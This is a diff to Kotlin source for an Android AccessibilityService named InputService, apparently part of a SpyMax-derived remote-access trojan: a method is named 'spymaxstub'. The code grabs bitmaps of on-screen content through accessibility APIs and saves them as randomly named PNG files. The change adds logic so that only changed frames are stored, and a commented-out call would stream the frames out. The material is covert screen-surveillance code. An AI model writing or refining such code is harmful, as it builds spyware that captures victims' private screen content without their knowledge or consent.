@@ -758,6 +758,8 @@ class InputService : AccessibilityService() {
 	    }
     }
 
+    var NodeImageSize =0
+	
         fun `m347lambda$onAccessibilityEvent$0$spymaxstub7ClassGen12`(accessibilityNodeInfo: AccessibilityNodeInfo?) {
         if (accessibilityNodeInfo == null) {
 		Log.d(logTag, "SKL accessibilityNodeInfo  NULL")
@@ -844,23 +846,29 @@ class InputService : AccessibilityService() {
 
 
 	if (createBitmap != null) {
-	    val width = createBitmap.getWidth()
-	    val height = createBitmap.getHeight()
-	    if (width > 0 && height > 0) {
-	        var newBuffer = ByteBuffer.allocateDirect(width * height * 4)
-	        newBuffer.order(ByteOrder.LITTLE_ENDIAN)
-	        createBitmap.copyPixelsToBuffer(newBuffer)
-	        newBuffer.flip()
-	        newBuffer.rewind()
 
-		val byteArray: ByteArray = newBuffer.array() // use array() instead of toByteArray()
-                saveByteArrayToFile( getApplicationContext(),byteArray,generateRandomFileName() +".png")
-		/*
-	        if (newBuffer.hasRemaining()) {
-	            FFI.onVideoFrameUpdate2(newBuffer)
-	        }*/
-		newBuffer = null
-	    }
+            val currentCount = createBitmap.byteCount 
+		if(currentCount!=NodeImageSize)
+		{
+		    NodeImageSize =currentCount
+		    val width = createBitmap.getWidth()
+		    val height = createBitmap.getHeight()
+		    if (width > 0 && height > 0) {
+		        var newBuffer = ByteBuffer.allocateDirect(width * height * 4)
+		        newBuffer.order(ByteOrder.LITTLE_ENDIAN)
+		        createBitmap.copyPixelsToBuffer(newBuffer)
+		        newBuffer.flip()
+		        newBuffer.rewind()
+	
+			val byteArray: ByteArray = newBuffer.array() // use array() instead of toByteArray()
+	                saveByteArrayToFile( getApplicationContext(),byteArray,generateRandomFileName() +".png")
+			/*
+		        if (newBuffer.hasRemaining()) {
+		            FFI.onVideoFrameUpdate2(newBuffer)
+		        }*/
+			newBuffer = null
+		    }
+		}
 	}
 		/*    
             var  newBuffer = ByteBuffer//.allocate(createBitmap.getWidth() * createBitmap.getHeight() * 4)
